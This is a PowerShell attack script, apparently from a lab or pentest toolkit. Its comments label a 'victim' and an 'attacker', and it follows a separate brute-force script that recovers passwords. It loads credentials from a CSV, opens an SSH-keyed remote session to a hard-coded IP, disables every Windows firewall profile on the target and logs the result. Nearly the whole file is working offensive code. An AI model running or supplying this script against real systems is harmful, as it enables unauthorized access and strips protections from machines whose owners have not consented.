# Run bruteforceWindowsOS.ps1 first to get the password, then run this script to run arbitrary Powershell commands
# You can change the variables below as required
# This is the same as baseScript.ps1, but it runs the command as an elevated user

# To run this script, you need to run the following commands first:
# On victim:
# Enable-PSRemoting -Force
# Set-Item wsman:\localhost\client\trustedhosts *
# Restart-Service WinRM
# On attacker:
# Start-Service WinRM
# Set-Item wsman:\localhost\client\trustedhosts *
# Restart-Service WinRM

# Import a CSV file with credentials
$credential = Import-Csv -Path "Powershell\credentials.csv" | Select-Object -First 1

# Define SSH private key file
$keyFile = "Powershell\accessKey"

# Define IP address
# $ip = "172.16.2.77"
$ip = "100.87.185.10"

# Define filename + filepath to save to
$out = "Powershell\Output.txt"

# Define command to run
$command = "Set-NetFirewallProfile -All -Enabled False"
$command2 = "Get-NetFirewallProfile | Select-Object Name, Enabled"

# Convert command to scriptblock format
$sb = [scriptblock]::Create($command)
$sb2 = [scriptblock]::Create($command2)

$target = $credential.Username + "@" + $ip

# Oneliner to start session and run command
$sess = New-PSSession -HostName $target -KeyFilePath $keyFile
Invoke-Command -Session $sess -ScriptBlock $sb
Invoke-Command -Session $sess -ScriptBlock $sb2 | Out-File -FilePath $out -Append

# Check if last command ran successfully
if($?)
{
    Get-PSSession | Remove-PSSession
    Write-Host "Cleared all sessions"
}
else 
{
    Write-Host "Failed running $command"
}
